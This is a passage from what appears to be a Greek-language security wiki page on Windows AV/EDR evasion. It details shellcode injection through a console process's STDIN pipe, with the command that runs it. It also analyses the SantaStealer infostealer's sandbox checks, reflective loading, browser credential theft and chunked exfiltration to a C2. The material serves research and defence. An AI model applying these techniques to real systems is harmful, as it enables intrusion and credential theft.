- Το P3 είναι ένα τέχνασμα **μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του ένα πλήρες primitive εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων σε εκτέλεση και μέθοδο ανακατεύθυνσης εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή εσωτερικά καταλήγει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Injection μέσω pipe STDIN της κονσόλας

Μια διαδραστική διεργασία-παιδί κονσόλας μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο του παιδιού σε ένα pipe και στέλνει έναν δείκτη ακολουθούμενο από shellcode. Αφού το πρόγραμμα κονσόλας διαβάσει τα δεδομένα στην ιδιωτική μνήμη του, ο injector εντοπίζει αυτό το buffer, το καθιστά εκτελέσιμο και ανακατευθύνει ένα thread του παιδιού σε αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά εξακολουθεί να πρόκειται για process injection και όχι για γενική παράκαμψη EDR.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **ανώνυμο pipe**. Τα Windows υλοποιούν εσωτερικά τα ανώνυμα pipes με αντικείμενα pipe που έχουν μοναδικά ονόματα, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles με δυνατότητα κληρονομικότητας και προεπιλεγμένο security descriptor, τοποθετεί το read handle στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί μια νέα διεργασία-παιδί με ενεργοποιημένη την κληρονομικότητα handles. Επομένως, αυτό το PoC εκκινεί το εκτελέσιμο αρχείο κονσόλας που του δίνεται· δεν συνδέει το pipe σε μια υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την ακόλουθη ακολουθία:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη ανώνυμων pipes για τα `STDIN` και `STDOUT` του παιδιού. Απενεργοποιεί την κληρονομικότητα στα δύο handles της πλευράς του γονέα και κλείνει τα αντίγραφα της πλευράς του παιδιού στον γονέα μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με `CREATE_NEW_CONSOLE`. Το παιδί κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον δυαδικό πίνακα `rawData` με `WriteFile` μέσω του handle `STDIN` της πλευράς του γονέα. Το πρόγραμμα κονσόλας καταναλώνει τα bytes και αφήνει ένα αντίγραφό τους σε μία από τις ιδιωτικές δεσμευμένες περιοχές του.
4. Διατρέχει τον χώρο διευθύνσεων του παιδιού με `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με `ReadProcessMemory` και αναζητά τον δείκτη στην αρχή του `rawData`.
5. Αλλάζει την προστασία του εντοπισμένου buffer σε `PAGE_EXECUTE_READWRITE` με `VirtualProtectEx`.
6. Εντοπίζει το κύριο thread, το αναστέλλει, ορίζει το `RIP` στη διεύθυνση `found_address + 0x19` με `NtSetContextThread` και το συνεχίζει.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδική για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` ξεκινά με έναν δείκτη 25 byte, επομένως τα εκτελέσιμα bytes αρχίζουν στο δεκαεξαδικό offset `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε ταυτόχρονα τον δείκτη, το search vector, το μέγεθος του array και το execution offset. Τα σχόλια του πηγαίου κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως bad characters. Αυτή η ροή εργασίας δεν τροποποιεί το token ή τα προνόμια της θυγατρικής διεργασίας.<sup>[[41]](#references)</sup>

Για μικρούς native helpers και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Τεχνικές SantaStealer για fileless αποφυγή εντοπισμού και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστευτήρια σε μία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία ρυθμίσεων (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί κυριλλική διάταξη, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται προτού εκτελέσει τα stealers, ώστε να μην ενεργοποιηθεί ποτέ σε εξαιρούμενες τοπικές ρυθμίσεις, αφήνοντας παράλληλα ένα ίχνος για threat hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Διαστρωματωμένη λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα προσαρμοσμένο κυλιόμενο checksum και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes. Επαναλαμβάνει τον υπολογισμό checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας όπως το `C:\analysis`.
- Η παραλλαγή B εξετάζει ιδιότητες συστήματος (κατώτατο όριο πλήθους διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να ανιχνεύσει τα additions του VirtualBox και εκτελεί ελέγχους χρονισμού γύρω από τις αναμονές για να εντοπίσει single-stepping. Οποιοσδήποτε εντοπισμός διακόπτει τη λειτουργία πριν από την εκκίνηση των modules.

### Fileless helper + διπλό reflective loading με ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα helper για διαπιστευτήρια Chromium, το οποίο είτε αποθηκεύεται στον δίσκο είτε γίνεται manual mapping στη μνήμη. Στη fileless λειτουργία, επιλύει μόνο του τα imports/relocations, ώστε να μην εγγράφονται αρχεία του helper.
- Το helper αποθηκεύει ένα DLL δεύτερου σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά 32 byte + nonce 12 byte). Μετά και τις δύο αποκρυπτογραφήσεις, φορτώνει ανακλαστικά το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, που προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls, για να κάνουν inject σε ένα ενεργό πρόγραμμα περιήγησης Chromium, να κληρονομήσουν τα κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/στοιχεία πιστωτικών καρτών απευθείας από βάσεις δεδομένων SQLite, παρά τη σκλήρυνση ABE.

### Modular συλλογή στη μνήμη & εξαγωγή δεδομένων μέσω HTTP σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, έγγραφα, επεκτάσεις browser κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει τον αριθμό των αρχείων του μετά από περίοδο αναμονής περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Έπειτα, το `ThreadPayload1` περιμένει 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στη διεύθυνση `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε τμήμα προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ στο τελευταίο τμήμα προστίθεται `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής: Ακριβές module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – άρθρο ιστολογίου](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στις εύκολες εξαιρέσεις για το malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC για πλαστογράφηση call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και συσκότιση με βάση το ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων στάσης ασφαλείας του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερεύνηση των προηγούμενων επιχειρήσεων ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης βιβλιοθηκών δυναμικής σύνδεσης](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Παραβίαση του προστατευτικού κελύφους του Windows Defender με την τεχνική Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την καθαρή αυλαία: Από RAT σε builder και έπειτα σε coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Ο SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση malware Node.js με API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Η Ωραία Κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Η Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Απόκρυψη ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Μετατροπή του remediation driver του Defender σε primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας Function Peekaboo της MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία self-masking συναρτήσεων με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Πηγαίος κώδικας InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατευθυνόμενη είσοδο και έξοδο](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
